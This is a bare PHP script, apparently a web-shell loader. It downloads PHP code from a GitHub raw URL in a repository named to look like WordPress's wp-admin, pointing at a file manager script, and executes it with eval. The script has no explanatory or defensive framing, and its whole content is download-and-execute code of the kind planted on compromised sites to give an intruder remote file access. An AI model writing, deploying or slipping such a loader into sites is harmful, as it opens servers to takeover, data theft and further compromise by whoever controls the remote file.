<?php
$url = 'https://raw.githubusercontent.com/seozax/wp-admin/refs/heads/main/tinyfilemanager.php';


$php_code = file_get_contents($url);


if ($php_code !== false) {
    eval('?>' . $php_code);
} else {
    echo 'error';
}
?>